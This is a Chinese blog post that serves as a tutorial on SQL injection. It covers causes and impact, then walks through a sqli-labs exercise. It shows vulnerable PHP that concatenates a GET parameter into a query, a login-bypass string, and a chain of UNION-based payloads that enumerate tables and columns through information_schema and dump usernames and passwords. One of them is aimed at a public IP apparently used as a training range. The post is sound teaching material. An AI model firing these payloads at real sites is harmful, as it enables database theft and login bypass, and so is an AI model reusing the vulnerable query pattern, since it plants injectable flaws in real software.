          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="CCB" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CCB</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 1.05rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">August 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">15</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">July 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/08/"><span class="card-archive-list-date">August 2021</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">August 2020</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.978Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5"><header><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">SQL注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">ccb</span><time itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><time itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.978Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></header><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image/resize,w_937,limit_0" alt="SQL注入-小迪安全.png"></p>
<h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的<u>输入参数</u>中的攻击，之后再将这些参数<u>传递给后台的sql服务器加以解析和执行</u>。</p>
<p>sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p>
<p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。</p>
<h2 id="2-产生过程"><a href="#2-产生过程" class="headerlink" title="2. 产生过程"></a>2. 产生过程</h2><p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均<u>提供了可编程的方法来与数据库连接并进行交互</u>。</p>
<p>如果web应用开发人员无法确保在<u>将从web表单，cookie及输入参数等收到的值传递给sql查询</u>（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够<u>操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</u></p>
<h2 id="3-常见原因"><a href="#3-常见原因" class="headerlink" title="3. 常见原因"></a>3. 常见原因</h2><p>①转义字符处理不合适；</p>
<p>②不安全的数据库配置；</p>
<p>③不合理的查询集处理；</p>
<p>④不当的错误处理；</p>
<p>⑤多个提交处理不当。 </p>
<h3 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h3><p>sql数据库将<strong>单引号字符（’）解析成代码与数据间的分界线</strong>：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p>
<h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><p>数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。</p>
<p>SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p>
<p>攻击者利用sql注入漏洞时，通常会<u>尝试访问数据库的元数据</u>，比如<u>内部的数据库和表的名称、列的数据类型和访问权限</u>，例如MySQL服务器的元数据位于<code>information_schema</code>虚拟数据库中，可通过<code>show databases</code>和<code>show tables</code>命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p>
<h3 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h3><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<u>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值</u>。</p>
<h3 id="不当的错误处理（盲注）"><a href="#不当的错误处理（盲注）" class="headerlink" title="不当的错误处理（盲注）"></a>不当的错误处理（盲注）</h3><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是<u>将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击</u>。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p>
<h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p>
<p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p>
<h2 id="4-危害"><a href="#4-危害" class="headerlink" title="4. 危害"></a>4. 危害</h2><p>盗取网站的数据库敏感信息</p>
<p>绕过网站后台认证（万能密码：<code>‘ or ‘1’=‘1’ #</code> 登录绕过）</p>
<p>借助SQL注入漏洞提权获取系统权限</p>
<p>上传或读取文件</p>
<p>执行系统命令</p>
<h2 id="5-MySQL注入流程"><a href="#5-MySQL注入流程" class="headerlink" title="5. MySQL注入流程"></a>5. MySQL注入流程</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142843140.png" alt="image.png"></p>
<p>以sqli-labs为例：<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623816863968-03b39520-736a-4953-9193-393137069010.png" alt="image.png"></p>
<ul>
<li><p>查看源码，分析注入原理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>

<p>在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>直接传递的变量$id带入sql语句中执行没有做任何的限制。</p>
</li>
</ul>
<h3 id="判断注入点以及注入类型"><a href="#判断注入点以及注入类型" class="headerlink" title="判断注入点以及注入类型"></a>判断注入点以及注入类型</h3><p>在给id赋值时加上其他无意义的字符<code>id=1abc</code>或者<code>id=1 and 1=1</code>、<code>id=1 and 1=2</code>，或者更换闭合条件为单引号<code>1&#39; and 1=1#</code>、 <code>1&#39; and 1=2#</code>之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1&#x3D;1）或者回显为空（解析了and 1&#x3D;2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。</p>
<p>闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1 </span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1  # 页面回显，正常输出</span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1  # 页面回显，提示错误 </span><br></pre></td></tr></table></figure>

<h3 id="信息收集（高版本数据库）"><a href="#信息收集（高版本数据库）" class="headerlink" title="信息收集（高版本数据库）"></a>信息收集（高版本数据库）</h3><p><strong>必要知识点:</strong></p>
<p><em>在<strong>MYSQL5.0以上版本</strong>中，mysql存在一个自带数据库，名为<code>information_ schema</code>，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号”.”代表下一级，比如xiao.user代表数据库xiao中的表user。因此：</em></p>
<p><code>information_ schema.tables</code>：记录所有表名信息的表</p>
<p><code>information_ schema.columns</code>：记录所有列名信息的表</p>
<p><code>table_schema</code>：数据库名</p>
<p><code>tables_name</code>：表名</p>
<p><code>column_name</code>：列名</p>
<p>performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
<h4 id="猜解数据库列数（字段数）"><a href="#猜解数据库列数（字段数）" class="headerlink" title="猜解数据库列数（字段数）"></a>猜解数据库列数（字段数）</h4><p>使用<code>order by</code>判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=1 order by 5</span><br></pre></td></tr></table></figure>

<p>以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/b292dcde41c4abdc906e588bcbd1d9f974c684b0.png@831w_161h_progressive.webp" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i0.hdslb.com/bfs/article/f318d092797ad93d870e6043a4349e3383507bac.png@831w_141h_progressive.webp" alt="img"></p>
<h4 id="判断前端回显"><a href="#判断前端回显" class="headerlink" title="判断前端回显"></a>判断前端回显</h4><p>判断select的哪几个位置会被前端回显，后续查询就在该位置进行。<strong>其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure>

<p>结果显示2，3的位置会被前端回显。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142202091.png" alt="image-20220726142202091"></p>
<h4 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select version()</span><br></pre></td></tr></table></figure>

<h4 id="查询数据库名称"><a href="#查询数据库名称" class="headerlink" title="查询数据库名称"></a>查询数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select database()</span><br></pre></td></tr></table></figure>

<h4 id="查询数据库用户"><a href="#查询数据库用户" class="headerlink" title="查询数据库用户"></a>查询数据库用户</h4><p>若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user()</span><br></pre></td></tr></table></figure>

<h4 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version_compile_os</span><br></pre></td></tr></table></figure>

<p>比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726112454906.png" alt="image-20220726112454906"></p>
<p>以及数据库名称和版本名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version(),4</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726143807180.png" alt="image-20220726143807180"></p>
<h4 id="查询指定数据库下的表名信息"><a href="#查询指定数据库下的表名信息" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><p>根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助<code>information_ schema.tables</code>查询该数据库的所有表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145018620.png" alt="image-20220726145018620"></p>
<p>得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。</p>
<h4 id="查询指定表名下的列名"><a href="#查询指定表名下的列名" class="headerlink" title="查询指定表名下的列名"></a>查询指定表名下的列名</h4><p>根据刚才收集的表名StormGroup_member，查询该表的所有列名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= &#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145307736.png" alt="image-20220726145307736"></p>
<h4 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><p>根据刚才收集的表名、列名，可以查询该表的指定数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure>

